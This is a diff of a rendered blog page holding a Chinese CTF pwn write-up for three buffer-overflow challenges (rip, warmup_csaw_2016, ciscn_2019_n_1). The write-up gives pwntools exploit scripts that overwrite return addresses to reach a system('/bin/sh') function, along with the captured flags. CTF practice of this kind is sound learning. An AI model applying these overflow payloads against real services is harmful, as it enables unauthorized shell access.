@@ -242,28 +242,6 @@
           
           
           <li>
-            <a href="/tags/">
-              
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/archive/">
-              
-              归档
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
             <a href="/categories/">
               
               分类
@@ -275,9 +253,31 @@
           
           
           <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
             <a href="/about/">
               
               关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
               
               
             </a>
@@ -401,7 +401,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">253</span> In Total
+              Words <span class="post-count">255</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -463,33 +463,61 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><ol>
-<li>查看主函数，s 长度为 15，gets 传入值，可以不限大小，存在栈溢出<br><img src="rip1.png" alt="rip"><br><img src="rip2.png" alt="rip"></li>
-<li>发现危险函数存在 system(‘bin/sh’)，将地址溢出至 fun() 地址，触发函数<br><img src="rip3.png" alt="rip"><br><img src="rip4.png" alt="rip"></li>
-<li>因存在 栈平衡问题（不明白是什么），须先传入返回地址，通过 ropper 获取 ret 地址<br><img src="rip5.png" alt="rip"><br><img src="rip6.png" alt="rip"></li>
-<li>payload<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401016</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"><span class="comment"># gdb.attach(a) 运行出错</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></li>
-<li>flag<blockquote>
+        <h3 id="rip">rip</h3>
+<ol>
+<li>查看主函数，s 长度为 15，gets 传入值，可以不限大小，存在栈溢出<br>
+<img src="rip1.png" alt="rip"><br>
+<img src="rip2.png" alt="rip"></li>
+<li>发现危险函数存在 system(‘bin/sh’)，将地址溢出至 fun() 地址，触发函数<br>
+<img src="rip3.png" alt="rip"><br>
+<img src="rip4.png" alt="rip"></li>
+<li>因存在 栈平衡问题（不明白是什么），须先传入返回地址，通过 ropper 获取 ret 地址<br>
+<img src="rip5.png" alt="rip"><br>
+<img src="rip6.png" alt="rip"></li>
+<li>payload</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401016</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"><span class="comment"># gdb.attach(a) 运行出错</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>flag</li>
+</ol>
+<blockquote>
 <p>flag{5fbfa2d8-b033-451c-983e-d1759502b7c9}</p>
 </blockquote>
-</li>
+<h3 id="warmup-csaw-2016">warmup_csaw_2016</h3>
+<ol>
+<li>查看主函数，gets(v5) 存在栈溢出，发现危险函数<br>
+<img src="warmup_csaw_2016-1.png" alt="warmup_csaw_2016"><br>
+<img src="warmup_csaw_2016-2.png" alt="warmup_csaw_2016"><br>
+<img src="warmup_csaw_2016-3.png" alt="warmup_csaw_2016"></li>
+<li>payload</li>
 </ol>
-<h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><ol>
-<li>查看主函数，gets(v5) 存在栈溢出，发现危险函数<br><img src="warmup_csaw_2016-1.png" alt="warmup_csaw_2016"><br><img src="warmup_csaw_2016-2.png" alt="warmup_csaw_2016"><br><img src="warmup_csaw_2016-3.png" alt="warmup_csaw_2016"></li>
-<li>payload<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&quot;*&quot;</span> * <span class="number">72</span> + p64(<span class="number">0x40060D</span>))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></li>
-<li>flag<blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&quot;*&quot;</span> * <span class="number">72</span> + p64(<span class="number">0x40060D</span>))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>flag</li>
+</ol>
+<blockquote>
 <p>flag{05784468-6276-482f-958f-437c4f83234a}</p>
 </blockquote>
-</li>
-</ol>
-<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><ol>
+<h3 id="ciscn-2019-n-1">ciscn_2019_n_1</h3>
+<ol>
 <li>查看主要函数，存在栈溢出，有两种思路</li>
-<li>覆盖 小数值 的地址，通过判断<br><img src="ciscn_2019_n_1-1.png" alt="ciscn_2019_n_1"><br><img src="ciscn_2019_n_1-2.png" alt="ciscn_2019_n_1"><br><img src="ciscn_2019_n_1-3.png" alt="ciscn_2019_n_1"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = process(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>))  <span class="comment"># 将小数转化为 16进制</span></span><br><span class="line"><span class="comment"># gdb.attach(a)</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></li>
-<li>直接覆盖为 system() 地址，直接执行<br><img src="ciscn_2019_n_1-4.png" alt="ciscn_2019_n_1"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * <span class="number">0x38</span> + p64(<span class="number">0x4006BE</span>))</span><br><span class="line">a.interavtive()</span><br></pre></td></tr></table></figure></li>
-<li>flag<blockquote>
+<li>覆盖 小数值 的地址，通过判断<br>
+<img src="ciscn_2019_n_1-1.png" alt="ciscn_2019_n_1"><br>
+<img src="ciscn_2019_n_1-2.png" alt="ciscn_2019_n_1"><br>
+<img src="ciscn_2019_n_1-3.png" alt="ciscn_2019_n_1"></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = process(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>))  <span class="comment"># 将小数转化为 16进制</span></span><br><span class="line"><span class="comment"># gdb.attach(a)</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>直接覆盖为 system() 地址，直接执行<br>
+<img src="ciscn_2019_n_1-4.png" alt="ciscn_2019_n_1"></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(ip, port)</span><br><span class="line">a.sendline(<span class="string">&#x27;*&#x27;</span> * <span class="number">0x38</span> + p64(<span class="number">0x4006BE</span>))</span><br><span class="line">a.interavtive()</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>flag</li>
+</ol>
+<blockquote>
 <p>flag{7282e0c5-08b5-442c-a3da-6dd8a74f15ac}</p>
 </blockquote>
-</li>
-</ol>
 
 
         <hr>
